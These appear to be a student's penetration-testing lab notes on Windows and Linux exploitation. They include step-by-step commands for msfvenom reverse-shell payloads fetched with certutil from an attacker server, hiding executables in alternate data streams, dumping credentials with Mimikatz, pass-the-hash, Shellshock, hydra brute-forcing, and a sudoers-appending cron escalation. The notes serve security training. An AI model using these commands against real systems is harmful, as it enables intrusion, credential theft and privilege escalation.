	+ <mark style="background: #FF5582A6;">Impersonate-level</mark> tokens are created as a direct result of a non-interactive login on Windows, typically through specific system services or domain logons
		+ Can be used to impersonate a token on the local system and not any external systems that utilize the token
	+ <mark style="background: #FF5582A6;">Delegate-level</mark> tokens are typically created through an interactive login on windows, primarily through a tradition login, or through RDP
		+ Pose the largest threat as they can be used to impersonate tokens on any system

#### Windows Privileges ####
+ The process of impersonating access tokens to elevate privileges on a system will primarily depend on the privileges assigned to the account that has been exploited to gain initial access as well as the impersonation or delegation tokens available 
+ The following are the <mark style="background: #ADCCFFA6;">privileges that are required for successful impersonation attacks</mark>:
	+ `SeAssignPrimaryToken`: Allows a user to impersonate tokens
	+ `SeCreateToken`: This allows a user to create an arbitrary token with admin privileges 
	+ `SeImpersonatePrivilege`: Allows a user to create a process under the security context of another user typically with admin privileges 

#### The Incognito Module ####
+ `Incognito` is a built-in <mark style="background: #FF5582A6;">meterpreter</mark> module that was originally a standalone application that allows you to <mark style="background: #ADCCFFA6;">impersonate user tokens after successful exploitation</mark> 
+ Can use the incognito module to display a list of available tokes that we can impersonate 

to migrate a meterpreter system (for example you run a 32 bit shell on a 64 bit server):
+ `pgrep explorer` will look for the process id for the explorer.exe process
+ then will `migrate PROCESS_NUMBER`
+ Note: Will not work if on a unprivileged user account, which can be checked with `getuid` and `getprivs`

After running `getprivs` can see available tokens
+ if we have the `SeImpersonatePrivilege` token
  + This means the user account is able to impersonate other access tokens 

will now use <mark style="background: #FF5582A6;">incognito module</mark> by doing the following:
+ `load incognito`
+ Then will `list_tokens -u` to see the user account tokens
+ Then can use `impersonate_token "NAME_OF_TOKEN"` to impersonate that user and have elevate privileges 
+ Will now have to use `pgrep explorer` to find the new session to `migrate` to

Without having a token like `SeImpersonatePrivilege`, will have to use a potato attack to generate the token
+ depends on what user accounts in the group have the privileges 

## Windows File System Vulnerabilities ##

### Alternate Data Streams ###

+ Alternate Data Streams (<mark style="background: #BBFABBA6;">ADS</mark>) is an <mark style="background: #BBFABBA6;">NTFS</mark> (New Technology File System) file attribute and was designed to provide compatibility with the MacOS <mark style="background: #BBFABBA6;">HFS</mark> (hierarchical File System)
+ Any file created on an NTFS formatted drive will have two different forks/streams:
	+ <mark style="background: #ADCCFFA6;">Data stream</mark> - Default stream that contains the data of the file
	+ <mark style="background: #ADCCFFA6;">Resource stream</mark> - Typically contains the metadata of the file 
+ Attackers can use <mark style="background: #BBFABBA6;">ADS</mark> to <mark style="background: #FFF3A3A6;">hide malicious code or executables in legitimate files</mark> in order to evade detections 
+ This can be <mark style="background: #ADCCFFA6;">done by storing the malicious code or exe in the file attribute resource stream</mark> (metadata) of a legitimate file 
+ This technique is usually used to evade basic signature based AVs and static scanning tools 

In windows, can create a file from the command shell with `notepad`
+ Example: `notepad text.txt`
+ Will open it in notepad

After writing some text in the txt, can access the **Data stream** by clicking on it, and the **Resource stream** by right clicking and selecting `properties`
+ contains the metadata 

<mark style="background: #FF5582A6;">Can hide a file</mark> in the **Resource stream** with a `:`
+ Example: `notepad text.txt:secret.txt`
+ When you close it, it will only have what is in text.txt, and when the contents are listed with `dir` will only see text.txt

Can do the same with a exe payload
+ Example `type payload.exe > windowsLog.txt:winpease.exe`
	+ will put what is in the payload hidden in windowsLog.txt, named `winpease.exe`
+ Might want to <mark style="background: #FFF3A3A6;">put some info in the text file to make it look like a normal file </mark>
+ can run that exe with: `start windowsLog.txt:winpease.exe`
+ If that does not work will have to make a link by doing: `mklink wupdate.exe C:\Temp\windowslog.txt:winpease.exe`
	+ now whenever we type `wupdate` in the console, it will run that exe

## Windows Credential Dumping 

### Windows Password Hashes ###

+ This <mark style="background: #FFF3A3A6;">Windows OS stores hashed user account passwords locally</mark> in the <mark style="background: #BBFABBA6;">SAM</mark> (Security Accounts Manager) database
+ <mark style="background: #BBFABBA6;">Hashing</mark> is the process of converting a piece of data into anther value. A hashing function or algorithm is used to generate the new value. The result of the hashing algorithm is known as a hash or hash value
	+ In order to avoid storing passwords in clear text
+ Authentication and <mark style="background: #ADCCFFA6;">verification of user credentials</mark> is facilitated by the Local Security Authority (<mark style="background: #BBFABBA6;">LSA</mark>)
+ Windows versions up to Windows Server 2003 utilize two different types of hashes:
	+ **LM**
	+ **NTLM**
+ Windows <mark style="background: #FF5582A6;">disables</mark> **LM** hashing and utilized **NTLM** hashing from Windows Vista onwards

How to parse the hash:
+ Each field is <mark style="background: #BBFABBA6;">separated with colon</mark>. The fields are:
	+ 1st field: **username** (Administrator, User1, etc.) 
	+ 2nd field: **Relative Identification (RID)**: last 3-4 digits of the Security Identifier (SID), which are unique to each user 
	+ 3rd field: **LM hash** 
	+ 4th field: **NTLM hash**

#### SAM Database ####
+ <mark style="background: #BBFABBA6;">SAM</mark> (Security Account Manager) is a <mark style="background: #ADCCFFA6;">database file that is responsible for managing user accounts and passwords on Windows</mark>. All user account passwords stored in the SAM database are hashed
+ The <mark style="background: #BBFABBA6;">SAM</mark> database file <mark style="background: #FF5582A6;">cannot be copied while the OS is running</mark>
+ The Windows NT kernel keeps the SAM database file locked and as a result <mark style="background: #FFF3A3A6;">attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process</mark>
	+ Authentication and verification of user credentials is facilitated by the Local Security Authority (<mark style="background: #BBFABBA6;">LSA</mark>)
		+ Has a <mark style="background: #ADCCFFA6;">cache that will be attempted to be dumped</mark>
+ In modern versions of Windows, the <mark style="background: #FF5582A6;">SAM database is encrypted with a syskey </mark>
+ <mark style="background: #FF5582A6;">Note</mark>: Elevated/Administrative **privileges** are required in order to access and interact with the <mark style="background: #BBFABBA6;">LSASS</mark> process 

#### LM (LanMan) ####
+ <mark style="background: #BBFABBA6;">LM</mark> is the default <mark style="background: #ADCCFFA6;">hashing algorithm</mark> that was implemented in Windows OS prior to NT4.0
+ The protocol is used to hash user passwords, and the hashing process can be broken down into the following steps :
	+ The password is broken into two seven-character chunks
	+ All character are then converted into uppercase
		+ Not Case Sensitive
	+ Each chunk is then hashed separately with the <mark style="background: #ADCCFFA6;">DES algorithm</mark> 
+ LM hashing is generally considered to be a <mark style="background: #FF5582A6;">weak protocol</mark> and can <mark style="background: #FFF3A3A6;">easily be cracked</mark>, primarily because the password hash does not include salts, consequently making **brute-force** and **rainbow table** attacks <mark style="background: #ADCCFFA6;">effective against LM hashes</mark>

![](LMHash.png)

#### NTLM (NTHash) ####
+ <mark style="background: #BBFABBA6;">NTLM</mark> is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication involves using a valid username and password to authenticate successfully 
+ From Windows Vista onwards. <mark style="background: #ADCCFFA6;">Windows disables LM hashing and utilizes NTLM hashing </mark>
+ When a user account is created, it is encrypted using the <mark style="background: #FFF3A3A6;">MD4 hashing algorithm</mark>, while the original password is disposed of 
+ NTLM **improves** upon LM in the following ways:
	+ Does **not** split the hash in to two chunks 
	+ Case sensitive
	+ Allows the use of symbols and unicode characters
	+ Still no password salts

![](NTLMHash.png)

### Searching For Passwords In Windows Configuration Files ###

#### Windows Configuration Files ####
+ Windows can automate a variety of repetitive tasks as the mass rollout or installation of Windows on many systems
+ This is typically done through the use of the <mark style="background: #BBFABBA6;">Unattended Windows Setup utility</mark>, which is used to automate the mass installation/deployment of Windows on systems 
+ This tool utilizes configuration files that contain specific configurations and user account credentials, specifically the Administrators account's password
+ If the Unattended Windows Setup <mark style="background: #FFF3A3A6;">configuration files are left on the target system after installation, they can reveal user account credentials that can be used by attackers to authenticate with Windows target legitimately </mark>

#### Unattended Windows Setup ####
+ The <mark style="background: #BBFABBA6;">Unattended Windows setup</mark> utility will typically utilize one of the following configuration files that contain user account and system configuration information:
	+ `C:\Windows\Panther\Unattend.xml`
	+ `C:\Windows\Panther\Autounattend.xml`
+ As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be <mark style="background: #ADCCFFA6;">encoded in base64</mark>

On a unprivileged windows account, can check for other users with `net user`
	+ can also so the unprivileged accounts privileges with `whoami /priv`

On a Kali OS, we will generate a reverse shell with <mark style="background: #D2B3FFA6;">msfvenom</mark>
+ Example: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.9.2 LPORT=1234 -f exe > payload.exe`

With the payload, can set up a simple http server with the python module <mark style="background: #D2B3FFA6;">SimpleHTTPServer</mark> on the Kali OS
+ Example: `python -m SimpleHTTPServer 80`
+ Now we can go to the windows computer we are attacking, and use the server we are running on the Kali os to allow the windows computer to download the payload 

On the windows computer we are attacking, can <mark style="background: #ADCCFFA6;">download the payload</mark> with <mark style="background: #D2B3FFA6;">certutil</mark>
+ Example: `certutil -urlcache -f http://10.10.9.2/payload.exe payload.exe` where the IP is the Kali computer 

Will now go into <mark style="background: #FF5582A6;">msfconsole</mark> to set up the handler
+ Can do so with: `service postgresql start && msfconsole`
+ Will then `use multi/handler`
	+ `set payload windows/x64/meterpreter/reverse_tcp`
	+ `set LPORT 1234`
	+ `set LHOST 10.10.9.2`
+ Will now have a <mark style="background: #BBFABBA6;">reverse shell</mark> after running it, can find the `unattend.xml` and `download` it

When we `cat` the `unattend.xml`, we will scroll till we see `<AutoLogon>`
+ Example:
``` xml
<AutoLogon>
    <Password>
        <Value>QWRtaW5AMTIz</Value>
        <PlainText>false</PlainText>
    </Password>
    <Enabled>true</Enabled>
    <Username>administrator</Username>
```
+ Here we can see the administrators password, and that it is <mark style="background: #BBFABBA6;">base64</mark> encoded because the `<PlainText>` value is **false**

To remove the <mark style="background: #BBFABBA6;">base64</mark> encoding, will do the following:
+ `vim password.txt` and paste the encoded password in it
+ Utilize the <mark style="background: #D2B3FFA6;">base64</mark> tool with the `-d` option to decode
	+ Example: `base64 -d password.txt`
		+ which outputs `Admin@123`

Can verify it is the right credentials with <mark style="background: #D2B3FFA6;">psexec</mark> 
+ Example: `psexec.py Administrator@10.3.21.57`
	+ It will then ask for the password
+ Now have access to the target system as an admin 

### Dumping Hashes With Mimikatz ###

#### Mimikatz ####
+ <mark style="background: #D2B3FFA6;">Mimikatz</mark> is a Windows post-exploitation tool written by Benjamin Delpy
	+ <mark style="background: #FFF3A3A6;">Allows for the extraction of clear-text passwords</mark>, hashes and Kerberos tickets from memory 
+ The <mark style="background: #BBFABBA6;">SAM</mark> (Security Account Manager) database, is a database file on Windows systems that <mark style="background: #ADCCFFA6;">stores hashed user passwords</mark>
+ <mark style="background: #D2B3FFA6;">Mimikatz</mark> can be used to extract hashes from the <mark style="background: #BBFABBA6;">lsass.exe</mark> process memory where hashes are cached 
+ Can utilize the pre-compiled mimikatz executable, alternatively, if we have have access to a meterpreter session on a Windows target, can utilize the inbuilt <mark style="background: #FF5582A6;">meterpreter</mark> extension <mark style="background: #D2B3FFA6;">Kiwi</mark> 

<mark style="background: #FF5582A6;">NOTE</mark>: Mimikatz require's elevate privileges in order to run correctly 

Can find the process ID for <mark style="background: #BBFABBA6;">lsass</mark> with:
  + `pgrep lsass`
  + With admin privileges, can `migrate` to that process
  + Will now run `getuid`, if `NT AUTHORITY\SYSTEM`, we now have the highest privileges 

Will now start using <mark style="background: #D2B3FFA6;">kiwi</mark>
+ `load kiwi`
+ can see help menu with `?`
+ `creds_all` will dump all credentials 
	+ Though later windows versions do not store clear text passwords at all
+ `lsa_dump_sam` will drop all the NTLM hashes for the users on the system
	+ can provide the SysKey 
+ `lsa_dump_secrets` can provide some clear text credentials in some cases 

Can upload <mark style="background: #D2B3FFA6;">Mimikatz</mark> executable with the following:
+ Will need to upload with a meterpreter session, and should make or use the `Temp` folder
+ `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
+ Will the start a command shell session with `shell`
+ can executive it with `.\mimikatz.exe`
+ Now that mimikatz has started, will check if we have permissions to use it with `privilege::debug`
	+ if we get `Privilege '20' OK`, we can run it 
+ Can now dump the hashes with: `lsadump::sam`
	+ will provide <mark style="background: #ADCCFFA6;">much more information</mark> then <mark style="background: #D2B3FFA6;">kiwi</mark> 
+ can dump secrets with `lsadump::secrets`
+ can also potentially <mark style="background: #FFF3A3A6;">see clear text login passwords</mark> with `sekurlsa::logonpasswords`

### Pass-The-Hash Attacks ###

What can we do with **NTLM** hashes apart from cracking them?
+ can perform a <mark style="background: #BBFABBA6;">pass the hash</mark>

#### Pass-the-Hash ####
+ <mark style="background: #BBFABBA6;">Pass-the-hash</mark> is an exploitation technique that involves <mark style="background: #FFF3A3A6;">capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately </mark>
+ Can use multiple tools to facilitate a Pass-The-Hash attack:
  + <mark style="background: #FF5582A6;">Metasploit</mark> PsExec module 
  + <mark style="background: #D2B3FFA6;">Crackmapexec</mark> 
+ This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation 
  + This will allow persistence even if there is a patch 

For the <mark style="background: #FF5582A6;">Metasploit</mark> PsExec module , will also need the **lm** hash
+ can do so with `hashdump`
	+ Example output: `Administrator:500:aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d:::`
	+ This can be parsed as: `USERNAME:SID:LM_HASH:NTLM_HASH:::`
+ Will now `use exploit/windows/smb/psexec`
  + `set LPORT 4422`
  + `set RHOSTS 10.3.31.228`
  + `set SMBUSER Administrator`
  + `set SMBPASS PASSWORD_HASH` Notice that a hash is possible, but can also use clear text password
	+ Will need to pass both the LM and NTLM Hash
		+ Example: `aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d`
+ Can now `run` and get a <mark style="background: #FF5582A6;">meterpreter</mark> session 

Can also <mark style="background: #ADCCFFA6;">use pass the hash</mark> with <mark style="background: #D2B3FFA6;">Crackmapexec</mark> 
+ `crackmapexec smb 10.3.31.228 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d"`
	+ not that the `-H` is the NTLM hash 
	+ This will let you know if it is Pwn3d, can now use the `-x` flag to run commands 
		+ Example: `crackmapexec smb 10.3.31.228 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "ipconfig"`

# Linux #

## Linux Vulnerabilities ##

### Frequently Exploited Linux Services ###

+ <mark style="background: #BBFABBA6;">Linux</mark> is a free and open source OS what is comprised of the Linux kernel, which was developed by Linus Torvalds, and the GNU toolkit, which is a collection of software and utilities that was started and developed by Richard Stallman 
+ This combination of open source software is what makes up the Linux OS as a whole, commonly referred to as GNU/Linux
+ Linux has various use cases, however, it is <mark style="background: #FFF3A3A6;">typically deployed as a server OS</mark>. That means there are specific services and protocols that will typically be found running on a Linux server
+ These services provide an attacker with an access vector that they can utilized to gain access to the target host
+ Having a good understanding of what these services are, how they work, and their potential vulnerabilities is a vitally important skill to have as a penetration tester 

## Exploiting Linux Vulnerabilities ##

### Exploiting Bash CVE-2014-6271 Vulnerability (Shellshock) ###

Allows an attacker to <mark style="background: #ADCCFFA6;">remotely execute arbitrary commands on the target</mark> 
+ <mark style="background: #FFF3A3A6;">Vectors are Apache and Bash shell</mark>

#### CVE-2014-6271 - Shellshock ####
+ <mark style="background: #FF5582A6;">Shellshock</mark> (CVE-2014-6271) is the name given to a family of vulnerabilities in the Bash shell (since V1.3) that allows an attacker to execute remote arbitrary commands via Bash, consequently allowing the attacker to obtain remote access to the target system via a reverse shell
+ The <mark style="background: #FF5582A6;">Shellshock</mark> vulnerability was discovered by Stephane Chazelas on 12th of September 2014 and was made public on the 24th of September 2014
+ Bash is a Nix (unix) shell that is part of the GNU project and is the default shell for most Linux distribution
+ The <mark style="background: #FF5582A6;">Shellshock</mark> vulnerability is caused by a vulnerability in Bash, <mark style="background: #FFF3A3A6;">whereby Bash mistakenly executes trailing commands after a series of characters</mark>: `() [:;];.`
+ This vulnerability only affects Linux as Windows does not use Bash as it is not a **Nix based OS**
+ In the context or remote exploitation, **Apache web** servers configured to run `CGI` scripts or `.sh` scripts are also vulnerable to this attack 
+ `CGI` (<mark style="background: #BBFABBA6;">Common Gateway Interface</mark>) scripts are used by Apache to execute arbitrary commands on the Linux system, after which the output is displayed to the client
+ In order to exploit this vulnerability, will need to locate an input vector or script that allows you to communicate with Bash
+ In the context of an Apache web server, can <mark style="background: #ADCCFFA6;">utilize any legitimate CGI scripts accessible on the web server </mark>
+ Whenever a CGI script is executed, the web server will initiate a new process and run the CGI script with Bash
+ This vulnerability can be exploited both manually and automatically with the use of an <mark style="background: #FF5582A6;">MSF</mark> exploit module 

#### Shellshock Exploitation ####

Looking at an Apache server, it can be seen that there is a dynamic countdown of a server coming online:

![](WebsitePic.png)

Looking at the code, it can be seen that this is accomplished with a `.cgi` script:

![](WebsiteHTML.png)
+ This tells use the script `/gettime.cgi` is in the root, accessible, and uses bash
	+ A good potential vector 

To verify it is vulnerable, will use an nmap <mark style="background: #FFB86CA6;">script --script=http-shellshock</mark>
+ Example: `nmap -sV 192.45.16.3 --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi"`
	+ <mark style="background: #FF5582A6;">Note</mark>: see that the script args are specified with where the `.cgi` file is 

Will then search the location of the script with burp proxy on 
+ In this example it would be `192.24.241.3/gettime.cgi`
+ Which will catch the following:

![](OGBurpCapture.png)

Will then <mark style="background: #FFF3A3A6;">change the User-Agent info</mark> to have the `() [:;];.` characters followed by the commands we want to run 

![](ShellshockexploitBurp.png)

Can now <mark style="background: #ADCCFFA6;">use this to setup a Reverse Shell</mark>
+ Will first set up a Kali listener 
  + Example `nc -nvlp 1234`
+ Then will send the following:

![](ShellshockManualReverseShell.png)

Can do things such as 
+ `whoami`
+ see distribution with `cat /etc/*issue`
+ Kernel info with `uname -a`

Can automate this process with <mark style="background: #FF5582A6;">msfconsole</mark>
+ can `search shellshock`
+ `use exploit/multi/http/apache_mod_cgi_bash_env_exec`
+ `set RHOSTS 192.45.16.3`
+ specify the path to the `.cgi` script with `set TARGETURI /gettime.cgi`
+ After running it, will have a meterpreter session 

### Exploiting FTP ###

#### Exploiting FTP ####
+ <mark style="background: #BBFABBA6;">FTP</mark> (File Transfer Protocol) uses TCP port 21 and is used to facilitate file sharing between a server and clients
+ Frequently used as a means of transferring files to and from the director of a web server 
+ FTP authentication requires a username and password combination. So we can brute-force attack on the FTP server in order to identify legitimate credentials
+ In some cases, FTP servers may be configured to allow anonymous access, which consequently allows anyone to access the Ftp server without providing any legitimate credentials

Can check for <mark style="background: #ADCCFFA6;">anonymous access</mark> with the following ways 
+ `ftp TARGET_IP` and then put `anonymous` for the user name, skip the password (enter)
+ or use an nmap script specifically:  <mark style="background: #FFB86CA6;">--script=ftp-anon</mark>
  + <mark style="background: #FF5582A6;">Note:</mark> can look for nmap scripts with `ls -al /usr/share/nmap/scripts/ | grep ftp-*`

Can also <mark style="background: #FFF3A3A6;">brute-force</mark> with <mark style="background: #D2B3FFA6;">hydra</mark>
+ Example: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.27.30.3 -t 4 ftp`
	+ `-L` specifies user list
	+ `-P` specifies password list
	+ `-t` specifies numbers of threads 
	+ `ftp` is used to specify the service

With the credentials can log in using `ftp TARGET_IP`, and typing in the credentials
+ can download a file with `get FILE_NAME` 

### Exploiting SSH ###

+ <mark style="background: #BBFABBA6;">SSH</mark> (Secure Shell) is a remote admin protocol that offers encryption and is the successor to Telnet
+ Typically used for remote access to servers and systems 
+ <mark style="background: #BBFABBA6;">SSH</mark> uses TCP port 22 by default, however, like other services, it can be configured to use any other open TCP port
+ <mark style="background: #BBFABBA6;">SSH</mark> <mark style="background: #FF5582A6;">authentication</mark> can be configured in two ways:
	+ <mark style="background: #FF5582A6;">Username & password authentication </mark>
	+ <mark style="background: #FF5582A6;">Key based authentication </mark>
+ In the case of username and password authentication, can perform a brute-force attack on the <mark style="background: #BBFABBA6;">SSH</mark> server in order to identify legitimate credentials and consequently gain access to the target system 

Can also brute-force with <mark style="background: #D2B3FFA6;">hydra</mark>
+ Example: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt -t 4 192.16.191.3 ssh`
	+ `-L` specifies user list
	+ `-P` specifies password list
	+ `-t` specifies numbers of threads 
	+ `ssh` is used to specify the service

Can now <mark style="background: #FFF3A3A6;">login</mark> with `ssh USERNAME@TARGET_IP`
+ Will type in the password 
+ Can now use any CLI commands such as: 
	+ `cat /etc/*issue`
	+ `uname -r`
	+ `cat /etc/passwd`

### Exploiting SAMBA ###

+ <mark style="background: #BBFABBA6;">SMB</mark> (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a LAN
+ SMB uses port 445 (TCP). However, originally SMB ran on top of NetBIOS using port 139
+ <mark style="background: #BBFABBA6;">Samba</mark> is the Linux implementation  of SMB, and allows Windows systems to access Linux shares and devices 
+ <mark style="background: #BBFABBA6;">SAMBA</mark> utilizes username and password authentication in order to obtain access to the server or a network share 
+ Can perform a <mark style="background: #ADCCFFA6;">brute-force</mark> attack on the `SAMBA` server in order to obtain legitimate credentials 
+ After obtaining legitimate credentials, can use a utility called SMBMap in order to enumerate SAMBA share drives, list the contents of shares, as well as download files and execute remote commands on the target 
+ Can also utilize a tool called <mark style="background: #D2B3FFA6;">smbclient</mark>
	+ <mark style="background: #D2B3FFA6;">smbclient</mark> is a client that is part of the SAMBA software suite. It communicates with a LAN Manager server, offering an interface similar to the ftp program. It can be used to download files from the server to the local machine, upload files from the local machine to the server as well as retrieve dictionary information from the server

Can <mark style="background: #FFF3A3A6;">brute-force</mark> with <mark style="background: #D2B3FFA6;">hydra</mark>
+ Example: `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt -t 4 192.16.191.3 smb`
	+ `-L` specifies user list
	+ `-P` specifies password list
	+ `-t` specifies numbers of threads 
	+ `ssh` is used to specify the service

Can now use <mark style="background: #D2B3FFA6;">smbmap</mark> to <mark style="background: #FFF3A3A6;">scan</mark>
+ To enumerate the shares can use: `smbmap -H 192.67.177.3 -u admin -p password1`

can now use <mark style="background: #D2B3FFA6;">smbclient</mark> to <mark style="background: #FFF3A3A6;">interact with the shares</mark>
+ Example: `smbclient -L 192.67.177.3 -U admin`
	+ where it lists out the shares with the user admin 
+ Can connect to a share with: `smbclient //192.67.177.3/SHARE_NAME -U USER_NAME`
	+ can download with `get`

<mark style="background: #D2B3FFA6;">enum4linux</mark> can also be used to <mark style="background: #FFF3A3A6;">enumerate information on a target related to SAMBA</mark>
+ example: `enum4linux -a TARGET_IP`
	+ where `-a` means all

## Linux Privilege Escalations ##

### Linux Kernel Exploits ###

+ Kernel exploits on Linux will typically target vulnerabilities in the Linux kernel to execute arbitrary code in order to run privileged system commands or to obtain a system shell
+ This process will differ based on the Kernel version and distribution being targeted and the kernel exploit being used
+ Privilege escalation on Linux systems will typically follow the following methodology:
	+ Identify kernel vulnerabilities 
	+ Downloading, compiling and transferring kernel exploits on to the target system 

#### Tools ####
+ <mark style="background: #D2B3FFA6;">Linux-Exploit-Suggester</mark>
+ Designed to assist in detecting security deficiencies for given Linux kernel/Linux-based machine
+ It accesses (using heuristics methods) the exposure of the given kernel on every publicly known Linux kernel exploit
+ Will need to download from the Github
+ upload to target, and run it 
	+ Will show exploits, how to download, in order of what is most likely to work 

<mark style="background: #FF5582A6;">Warning</mark>:  Running non compatible exploits can cause crashes or kernel panics (data loss)

### Exploiting Misconfigured Cron Jobs ###

#### Cron Job ####
+ Linux implements <mark style="background: #FFF3A3A6;">task scheduling</mark> through a utility called Cron
+ Cron is a time-based service that runs applications, scripts and other commands repeatedly on a specific schedule 
+ An application, or script that has been configured to be run repeatedly with Cron is known as a Cron job. Cron can be used to automate or repeat a wide variety of functions on a system, from daily backups to system upgrades and patches
+ The crontab file is a configuration file that is used by the Cron utility to store and track Cron jobs that have been created.

#### Exploiting Cron Job ####
+ Cron jobs <mark style="background: #FFB86CA6;">can also be run as any user on the system</mark>, this a is very important factor to keep an eye on as we will be targeting Cron jobs that have been configured to be run as the "<mark style="background: #FF5582A6;">root</mark>" user
+ This is primary because, any script or command that is run by a Cron job will run as the root user and will consequently provide us with root access 
+ In order to elevate our privileges, we will need to find and identify cron jobs scheduled by the root user or the files being processed by the cron job 

Can list Cron Jobs with `crontab -l`
+ <mark style="background: #FF5582A6;">Note:</mark>this is only for the current log in, will not be able to see roots without being logged in as root 

Will now want to search the directory with `grep`
+ `grep -rnw /usr -e "/home/student/message` is an example that finds any occurrences of that path 
+ If a .sh is found, can use `ls -al PATH` to see permissions 
	+ if it is, can append something like this: `printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh` to give our user all permissions 
	+ Can then do `sudo su` to become root 

### Exploiting SUID Binaries ###

+ In addition to the three main file access permissions (read, write and execute), Linux also provides users with specialized permissions that can be utilized in specific situations 
	+ One of these access permissions is the <mark style="background: #BBFABBA6;">SUID</mark> (Set Owner User ID) permission 
+ When applied, this permission provides users with the ability to execute a script or binary <mark style="background: #FFF3A3A6;">with the permissions of the file owner as opposed to the user that is running the script or binary </mark>
+ <mark style="background: #BBFABBA6;">SUID</mark> permissions are typically used to provide unprivileged users with the ability to run specific scripts of binaries with "root" permission. It is to be noted, however, that the <mark style="background: #ADCCFFA6;">provision of elevate privileges is limited to the execution of the script</mark> and does not translate to elevation of privileges, however, if improperly configured unprivileged users <mark style="background: #FF5582A6;">can exploit misconfigurations or vulnerabilities within the binary or script, they can us it to obtain an elevated session.</mark>
	+ For example the `sudo` binary uses `SUID` to allow non privileged users to execute as root
+ This is the functionality that will be attempting to exploit in order to elevate our privileges, however, the success of out attack will depend on the following factors:
	+ Owner of the SUID binary - Given that we are attempting to elevate our privileges, we will only be exploiting SUID binaries that are owned by the "root" user or other privileged users 
	+ <mark style="background: #ADCCFFA6;">Access permissions</mark> - We will require executable permissions in order to execute the SUID binary

Will use `ls -al` to see if a file has the permissions such it can be ruin with `SUID`
+ can see more details about the file with `file`
+ `strings` will give a list of strings being used 
	+ might be able to see if it calls upon another binary 
		+ if it does, can delete that binary and make it how we want

if we `cp /bin/bash FILE_NAME_SUID_FILE_CALLS`
+ It will give us a root shell
+ Essentially we are running a file with `SUID`, that file calls on a file that we changed, the changed file will run a bash shell as the root giving us root access

## Linux Credential Dumping ##

### Dumping Linux Password Hashes ###

+ Linux has multi-user support
  + Multiple can access the system simultaneously 
+ All of the information for all accounts on Linux is stored in the <mark style="background: #ADCCFFA6;">passwd file located in</mark>: `/etc/passwd`
+ Cannot view the passwords for the users in the passwd file because they are encrypted, and passed file is readable by any user on the system 
+ All the <mark style="background: #ADCCFFA6;">encrypted passwords for the users are stored in the shadow file</mark>, can be found in `/etc/shadow`
+ The <mark style="background: #FFF3A3A6;">shadow file can only be accessed and read by the root</mark>
	+ Prevents other accounts on the system from accessing the hashed passwords 

#### Linux Password Hashes ####
+ The passwd file gives us information in regards to the hashing algorithm that is being used and the password hash 
	+ Helpful in determining the type of hashing algorithm that is being used and its strength 
	+ Can determine his by looking at the number after the username encapsulated by the dollar symbol ($)
![](Linux_Password_Hashes.png)

When given a command shell session, should use `/bin/bash -i` to start a shell
+ Can then background that session and start a meterpreter session with `sessions -u 1`

Once in as root, can <mark style="background: #ADCCFFA6;">dump the hashes</mark> with:
+ `cat /etc/shadow`
+ Or `use post/linux/gather/hashdump` in <mark style="background: #FF5582A6;">msfconsole</mark>

Can crack those passwords with `use auxiliary/analyze/crack_linux` in <mark style="background: #FF5582A6;">msfconsole</mark>